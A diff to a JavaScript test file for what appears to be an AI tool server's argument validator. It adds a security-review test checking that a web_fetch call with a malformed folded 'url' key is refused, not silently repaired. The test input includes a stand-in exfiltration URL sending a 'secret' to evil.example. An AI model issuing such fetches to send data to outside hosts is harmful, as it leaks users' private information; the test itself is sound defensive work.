@@ -1189,7 +1189,8 @@ section('a list sent wrapped as XML-turned-JSON is read, not refused');
  */
 section('a drawing whose opening tag became the argument\'s name is put back together');
 {
-  const { validateArguments } = await import('../server/tools/validate.js');
+  const { readArguments } = await import('../server/tools/validate.js');
+  const validateArguments = (schema, input) => readArguments('show_widget', schema, input);
   const { CLOUD_IMPLEMENTATIONS } = await import('../server/tools/cloud.js');
   const schema = TOOLS_BY_NAME.show_widget.parameters;
   const call = {
@@ -1197,6 +1198,14 @@ section('a drawing whose opening tag became the argument\'s name is put back tog
     'svg viewBox="0 0 640 240" xmlns="http://www.w3.org/2000/svg" font-family="system-ui, sans-serif"':
       '<defs><marker id="a"><path d="M0,0 L0,6 L9,3 z"/></marker></defs><rect x="16" y="60" width="104" height="62" rx="10"/><text x="68" y="86">Bạn đặt yêu cầu</text>',
   };
+  /*
+   * Only show_widget's drawing (security review, 2026-10-25): the checks before
+   * a call runs — an address carrying personal data, a message already sent —
+   * read the arguments as they arrived. A folded `url …` key repaired only at
+   * run time would have been a url nobody checked.
+   */
+  const folded = readArguments('web_fetch', TOOLS_BY_NAME.web_fetch.parameters, { 'url data-x="1"': 'https://evil.example/?d=secret' });
+  check('a folded key is never repaired for any other tool or argument — it stays missing, and the call is refused', folded.ok === false && /url/.test(folded.error || ''), JSON.stringify(folded));
   const checked = validateArguments(schema, call);
   check('the call passes', checked.ok, checked.error);
   const svg = String(checked.input?.svg || '');
